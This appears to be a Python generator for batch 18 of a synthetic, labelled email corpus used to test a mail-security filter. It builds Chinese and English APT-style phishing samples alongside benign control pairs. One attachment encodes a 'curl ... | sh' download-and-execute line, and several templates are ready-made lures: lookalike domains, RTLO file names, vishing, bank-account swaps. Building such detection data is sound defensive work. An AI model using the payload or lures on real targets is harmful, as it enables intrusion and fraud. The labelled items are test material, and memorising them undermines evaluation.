#!/usr/bin/env python3
"""Batch 18: APT stage-chains, infrastructure tricks, and undetectable-pair grays."""
import base64, json, os
HERE = os.path.dirname(os.path.abspath(__file__)); ROOT = os.path.dirname(HERE)
LABELS = []
def W(n, raw): open(os.path.join(ROOT, "synth", n), "wb").write(raw)
def HD(disp, frm, to, subj, extra="", ct="text/plain; charset=utf-8"):
    b = base64.b64encode(disp.encode()).decode()
    return (f"From: =?utf-8?B?{b}?= <{frm}>\r\nTo: {to}\r\n"
            f"Date: Thu, 10 Sep 2026 08:{10+len(LABELS)%49:02d}:00 +0800\r\n"
            f"Message-ID: <{len(LABELS):04d}-b18@synth.example>\r\n" + extra +
            f"Subject: {subj}\r\nMIME-Version: 1.0\r\nContent-Type: {ct}\r\n\r\n")
def ATT(hdr, t, fn, ct, b64):
    return (hdr + "Content-Type: multipart/mixed; boundary=\"BS\"\r\n\r\n"
            f"--BS\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n{t}\r\n"
            f"--BS\r\nContent-Type: {ct}\r\nContent-Disposition: attachment; filename=\"{fn}\"\r\n"
            f"Content-Transfer-Encoding: base64\r\n\r\n{b64}\r\n--BS--\r\n")
def E(n, raw, label, family, tech, note="", lang="zh", fmt="plain",
      expected=None, ambiguous=False, borderline=""):
    W(n, raw if isinstance(raw, bytes) else raw.encode())
    LABELS.append({"file": f"synth/{n}", "case_id": n[:-4], "label": label,
        "family": family, "language": lang, "techniques": tech,
        "expected": expected or ("block" if label == "malicious" else "deliver"),
        "engine_status": "not_evaluated", "synthetic": True, "batch": 18,
        "format": fmt, "note": note, "ambiguous": ambiguous, "borderline": borderline})

# ---------------- stage chain & infra tricks (20 mal) ----------------
E("mal_0286_apt_stage1_rapport.eml",
  HD("议程委员会-张", "pc.zhang@conf-official.example", "sec-research@corp.internal",
     "很高兴在会场交流")
  + "王老师您好：\r\n\r\n"
  "昨天圆桌您提的'网关侧凭据中转'思路很有意思，内部我们也在看类似方向。\r\n"
  "不着急，等您回京有空约个咖啡。\r\n\r\n张",
  "malicious", "apt", ["stage1_rapport_no_payload"],
  "阶段一：无链接无附件纯建立信任", "zh", "plain", "review",
  True, "单封完全良性；仅在与阶段二关联时才构成攻击——检测需事后图谱关联，标注为 review")

E("mal_0287_apt_stage2_payload.eml",
  ATT(HD("议程委员会-张", "pc.zhang@conf-official.example", "sec-research@corp.internal",
         "Re: 很高兴在会场交流", "In-Reply-To: <stage1@corp.internal>\r\n"),
      "上次说的内部材料整理了一份给您参考（压缩包，密码随后短信）。",
      "reference_materials.rar", "application/vnd.rar",
      base64.b64encode(b"Rar!\x1a\x07\x01\x00" + b"\x00"*80).decode()),
  "malicious", "apt", ["stage2_payload_on_rapport", "rar_symlink"],
  "阶段二：在信任线程上投递 RAR")

E("mal_0288_apt_homoglyph_domain.eml",
  HD("门户运营", "ops@portal.corp\u2011internal.example", "staff@corp.internal",
     "门户登录异常排查通知")
  + "部分用户反映门户登录异常，请使用备用入口重试：\r\n"
  "https://portal.corp\u2011internal.example/login2\r\n",
  "malicious", "apt", ["non_breaking_hyphen_domain"],
  "域名字符使用 U+2011 不换行连字符仿内网域名")

E("mal_0289_apt_punycode_sso.eml",
  HD("统一认证", "sso@sso\u2011gw.example", "staff@corp.internal", "SSO 网关升级通知")
  + "SSO 网关升级后需重新激活会话：\r\n"
  "https://xn--sso-gw-9g9b.example/activate\r\n",
  "malicious", "apt", ["punycode_sso_lookalike"], "punycode 仿 SSO 域")

E("mal_0290_apt_webdav_unc.eml",
  HD("协同平台", "co@doc-share6.example", "eng@corp.internal", "评审文档（协同编辑）")
  + "文档已放到协同目录，直接打开编辑（保持在线）：\r\n"
  "\\\\doc-share6.example@dav\\review\\gw-timeout.docx\r\n",
  "malicious", "apt", ["webdav_unc_lure"],
  "UNC/WebDAV 路径诱导 Windows 远程取文档")

E("mal_0291_apt_workers_dev.eml",
  HD("市场部", "mkt@brand-relay6.example", "pr@corp.internal", "新闻稿最终版")
  + "新闻稿最终版请过目（预览链接）：\r\n"
  "https://pr-preview-6a3f.workers.dev/final.html\r\n",
  "malicious", "apt", ["cdn_worker_proxy_url"], "边缘 Worker 当中转")

E("mal_0292_apt_shortener_chain.eml",
  HD("行政", "admin@corp-relay7.example", "staff@corp.internal", "班车调整通知")
  + "班车 3 号线加密班次，详情图：\r\n"
  "https://bit-ly-example.com/3xK9pQ\r\n",
  "malicious", "apt", ["shortener_chain"],
  "短链→Worker→落地页的链式中转")

E("mal_0293_apt_eml_in_eml.eml",
  ATT(HD("法务", "legal@partner-relay8.example", "legal@corp.internal",
         "客户来函（转发原件）"),
      "客户原始来函如附件（eml 原件）。", "客户来函.eml", "message/rfc822",
      base64.b64encode(b"From: c@x\r\nSubject: ok\r\n\r\ncontent").decode()),
  "malicious", "apt", ["nested_eml_rendering"],
  "EML 套 EML，客户端渲染差异", "zh", "plain", "review", True,
  "嵌套容器本身可见，但内层样本无恶意 URL、凭据或执行动作，需人工确认")

E("mal_0294_apt_signed_rtlo.eml",
  ATT(HD("赵工", "zhao@partner-relay5.example", "eng@corp.internal",
         "Re: 图纸第4版", "In-Reply-To: <dwg-v4@corp.internal>\r\n"),
      "签字页更新，见附件。",
      "\u202egnp.exe_签字页.exe", "application/octet-stream",
      base64.b64encode(b"MZ\x90\x00" + b"\x90"*64).decode()),
  "malicious", "apt", ["rtlo_on_real_thread"], "真线程上的 RTLO 文件名")

E("mal_0295_apt_compromised_site.eml",
  HD("学术通讯", "news@acm-like-club.example", "research@corp.internal",
     "本月系统安全研讨会资料")
  + "本月研讨会的 slides 与视频已上线（校园镜像）：\r\n"
  "https://www.sys-seminar-edu.example.org/2026/sept/\r\n",
  "malicious", "apt", ["compromised_legit_site"],
  "域名完全正常——模拟'真站被挂马'的场景", "zh", "plain", "review",
  True, "域名与话术均真实可信；此类只能靠站点信誉/爬虫回检发现，静态邮件层不可判定")

E("mal_0296_apt_lic_payload.eml",
  ATT(HD("商务", "biz@sdk-vendor7.example", "eng@corp.internal", "SDK 许可证文件（续期）"),
      "许可证文件放到安装目录后重启服务即可。",
      "license.lic", "application/octet-stream",
      base64.b64encode(b"#!/bin/sh\ncurl http://203.0.113.90/a|sh\n").decode()),
  "malicious", "apt", ["license_disguised_script"],
  "许可证外壳的脚本载荷")

E("mal_0297_apt_wechat_offplatform.eml",
  HD("匿名推荐人", "ref@anonymous-ref.example", "hr@corp.internal",
     "一位候选人的私下反馈（请勿公开）")
  + "关于贵司某候选人的背景，我有一些不便公开的信息。\r\n"
  "方便加我个人微信详聊：wxid_88f2k（备注'HR'）。\r\n"
  "请勿回复本邮箱。\r\n",
  "malicious", "apt", ["offplatform_contact_lure"],
  "引流私域投放，邮件本体零特征", "zh", "plain", "review",
  True, "无链接无附件无关键词；攻击面在私域，邮件层不可判定，标 review 供人工复核语料")

E("mal_0298_apt_vishing_corp.eml",
  HD("运维值班", "duty@noc-relay9.example", "it@corp.internal", "Re: 工单 ITSM-7712（待您确认）",
     "In-Reply-To: <itsm-7712@corp.internal>\r\n")
  + "工单处理需要您配合做一次后台确认。\r\n"
  "回拨值班专线 0571-88xx-9911（转 2），报工单号即可。\r\n"
  "今晚前处理完成，避免升级。\r\n",
  "malicious", "apt", ["vishing_on_real_ticket"], "真工单线程上的电话回拨钓鱼")

E("mal_0299_apt_gdpr_admin.eml",
  HD("Data Protection", "dpo@rights-request.example", "privacy@corp.internal",
     "Data erasure request - identity verification")
  + "Dear Admin,\n\n"
  "A data subject requests erasure. Verify the requester's identity before\r\n"
  "processing: https://rights-verify.example.org/case/9917\r\n",
  "malicious", "apt", ["fake_dsar_verify"], "假数据主体请求诱导管理员", "en")

E("mal_0300_apt_meeting_fw.eml",
  ATT(HD("总经办-秘书", "sec@office-relay10.example", "leaders@corp.internal",
         "FW: 明日高管闭门会材料"),
      "各位总：材料汇总如附件，纸质版会场发放。",
      "闭门会材料.hwp", "application/x-hwp",
      base64.b64encode(b"HWP Document File\x00\x01\x02" + b"\x00"*40).decode()),
  "malicious", "apt", ["hwp附件", "exec_forward_lure"],
  "HWP 文档载荷（区域化办公套件习惯）")

E("mal_0301_apt_voicemail_ent.eml",
  HD("IP-PBX", "vm@pbx-relay11.example", "leaders@corp.internal", "语音留言：来自'总部' (0:58)")
  + "您有一条新留言，来自'总部'（0:58）。\r\n"
  "在线收听：https://pbx-relay11.example/vm/8812\r\n"
  "留言 3 日后删除。\r\n",
  "malicious", "apt", ["enterprise_voicemail_lure"], "企业话机语音信箱仿冒")

E("mal_0302_apt_firmware.eml",
  ATT(HD("供应链安全", "sec@hw-vendor12.example", "dcops@corp.internal",
         "网关固件安全更新（CVE-2026-3318）"),
      "固件包见附件，升级说明在包内 README。",
      "fw-gw-1.9.5.bin", "application/octet-stream",
      base64.b64encode(b"\x1f\x8b\x08\x00" + b"\x00"*32 + b"#!/bin/sh\nreboot\n").decode()),
  "malicious", "apt", ["firmware_disguise"], "固件外壳伪装载荷")

E("mal_0303_apt_efax.eml",
  ATT(HD("eFax", "fax@efax-relay13.example", "front@corp.internal", "您收到 3 页传真（来自 0571-88xx）"),
      "传真内容见附件 PDF。", "fax_8842.pdf", "application/pdf",
      base64.b64encode(b"%PDF-1.7\n%/JS (app.launch)\n" + b"\x00"*40).decode()),
  "malicious", "apt", ["efax_pdf_launch"],
  "传真通知壳+PDF Launch 动作载荷")

E("mal_0304_apt_signed_macro_doc.eml",
  ATT(HD("合规部-外部顾问", "advisor@consult-relay14.example", "compliance@corp.internal",
         "尽调清单（启用宏后自动汇总）"),
      "清单需要启用宏运行汇总脚本，结果自动回传顾问邮箱。",
      "due_diligence.docm", "application/vnd.ms-word.document.macroEnabled.12",
      base64.b64encode(b"PK\x03\x04" + b"\x00"*64).decode()),
  "malicious", "apt", ["macro_doc_external_consultant"],
  "外部顾问话术的宏文档")

E("mal_0305_apt_subdomain_brand.eml",
  HD("Microsoft", "ms@mail.microsoft.com.verify-acc.example", "staff@corp.internal",
     "Security alert: unusual sign-in")
  + "A sign-in from a new location was detected for your account.\r\n"
  "Review: https://mail.microsoft.com.verify-acc.example/check\r\n",
  "malicious", "apt", ["brand_subdomain_delegation"],
  "真品牌域做子域+主域在攻击者手里", "en")

# ---------------- gray pairs (10) ----------------
E("gray_0071_partner_thread_clean2.eml",
  HD("华信贸易-应收", "ap@hongxin-trade.example", "ap@corp.internal",
     "Re: 9月货款（第3次跟进）",
     "In-Reply-To: <po-2026-203@corp.internal>\r\nReferences: <po-2026-203@corp.internal>\r\n")
  + "王会计，9 月货款银行那边显示在途了吗？\r\n"
  "在途的话回个信，我们对账好平掉。\r\n",
  "benign", "ham_business", ["partner_thread_legit_followup"],
  "真实合作方域+真线程", "zh", "plain", "deliver", True,
  "与 mal_0283 唯一差异是'是否提出账户变更'——语义模型要能区分 ask 的内容")

E("gray_0072_partner_thread_swap2.eml",
  HD("华信贸易-应收", "ap@hongxin-trade.example", "ap@corp.internal",
     "Re: 9月货款（账户更新）",
     "In-Reply-To: <po-2026-203@corp.internal>\r\nReferences: <po-2026-203@corp.internal>\r\n")
  + "王会计，财务刚通知开户行网点调整，本月起收款账户启用新的：\r\n"
  "6225 0091 5580 2231（户名不变）。\r\n"
  "麻烦按新账户安排，旧账户明天停用。\r\n",
  "malicious", "apt", ["partner_thread_bank_swap"],
  "同域同线程的账户变更（无法分辨真假域名是否被劫持）", "zh", "plain", "review", True,
  "账户劫持后的真实形态：域名真、线程真、只有'变更账户'这一个动作——必须复核而非自动放行")

E("gray_0073_roundtable_real.eml",
  HD("研讨筹委", "secr@industry-rt.example", "policy@corp.internal",
     "闭门研讨第4期：议程确认")
  + "您好：议程已排定（附件区 PDF），阅读材料会后统一发。\r\n"
  "确认出席回复本邮件即可。\r\n",
  "benign", "ham_business", ["roundtable_real_pdf_no_link"],
  "真闭门邀约：材料走附件不走链接", "zh", "plain", "deliver", True,
  "与 mal_0272 对照：真件不发'需登录的阅读链接'")

E("gray_0074_brief_case_fake.eml",
  HD("Talent", "hello@labs-careers.example", "dev@corp.internal",
     "Paid technical interview (2h, $400)")
  + "Hi,\n\n"
  "We'd like to commission a 2h paid design exercise. Upload your solution:\n"
  "https://labs-careers.example/upload/exercise\n\n"
  "Payment regardless of result.\n",
  "malicious", "apt", ["paid_exercise_upload"],
  "付费面谈+上传页收集", "en", "plain", "review", True,
  "付费降低戒心；真招聘也有付费案例，区分靠平台域与历史往来")

E("gray_0075_cert_zip_pair_real.eml",
  HD("区域CERT", "alert@cert-official.example", "sec@corp.internal",
     "预警通报（IOC 网页版）")
  + "通报正文与 IOC 已发布在官网：https://cert-official.example/2026-091\r\n"
  "密码保护的样本包仅向注册成员开放下载。\r\n",
  "benign", "ham_business", ["cert_real_web_only"],
  "真 CERT 只发网页链接", "zh", "plain", "deliver", True,
  "与 mal_0274 对照：真通报不带邮件附件密码包")

E("gray_0076_fax_real.eml",
  HD("eFax", "fax@efax.example", "front@corp.internal", "您收到 1 页传真（内部测试）")
  + "传真预览与 PDF 在 eFax 门户内查看（登录后-收件箱）：\r\n"
  "https://www.efax-example.com/inbox\r\n"
  "（附件形式的传真请警惕）\r\n",
  "benign", "ham_business", ["efax_real_portal"],
  "真传真服务走门户", "zh", "plain", "deliver", True,
  "与 mal_0303 对照：真件引导门户而非直接给 PDF 附件")

E("gray_0077_voicemail_real.eml",
  HD("IP-PBX", "vm@corp.internal", "leaders@corp.internal", "语音留言：来自总部 (0:58)")
  + "您有一条新留言，请拨打话机留言信箱号码（分机 6000-9）收听。\r\n"
  "本邮件不含收听链接。\r\n",
  "benign", "ham_business", ["voicemail_real_internal_ext"],
  "真语音留言走分机", "zh", "plain", "deliver", True,
  "与 mal_0301 对照：内网分机 vs 外部链接")

E("gray_0078_firmware_real.eml",
  HD("供应链安全", "sec@hw-vendor.example", "dcops@corp.internal",
     "固件更新公告（官网下载）")
  + "CVE-2026-3318 修复固件已发布，请从厂商支持官网下载（序列号登录）：\r\n"
  "https://support.hw-vendor.example/downloads\r\n"
  "我们不通过邮件附件分发固件。\r\n",
  "benign", "ham_business", ["firmware_real_portal"],
  "真固件走官网", "zh", "plain", "deliver", True,
  "与 mal_0302 对照：真厂商明确'不发附件'")

E("gray_0079_conf_materials_fake.eml",
  HD("会务组", "materials@conf-official.example", "research@corp.internal",
     "Re: 现场照片（高清打包）",
     "In-Reply-To: <photo-38@corp.internal>\r\n")
  + "高清版打包好了，网盘链接（24h 有效）：\r\n"
  "https://conf-official.example.highcdn-share.info/d/38\r\n",
  "malicious", "apt", ["real_domain_then_hijack_link"],
  "发件域真，链接域是拼接仿冒", "zh", "plain", "block", True,
  "链接域前缀拼接官方域——域名解析知识题，语义模型看前缀不可信")

E("gray_0080_conf_materials_real.eml",
  HD("会务组-小陈", "chen@conf-official.example", "research@corp.internal",
     "Re: 现场照片（高清打包）",
     "In-Reply-To: <photo-38@corp.internal>\r\n")
  + "高清版打包好了，放在官方相册目录：\r\n"
  "https://conf-official.example/album/38-hires\r\n",
  "benign", "ham_business", ["conf_album_same_domain"],
  "域完全一致", "zh", "plain", "deliver", True,
  "与 gray_0079 逐字级对照；唯一差异是链接域")

with open(os.path.join(ROOT, "synth", "labels.jsonl"), "a", encoding="utf-8") as f:
    for e in LABELS: f.write(json.dumps(e, ensure_ascii=False) + "\n")
print(f"batch18 written: {len(LABELS)} samples")
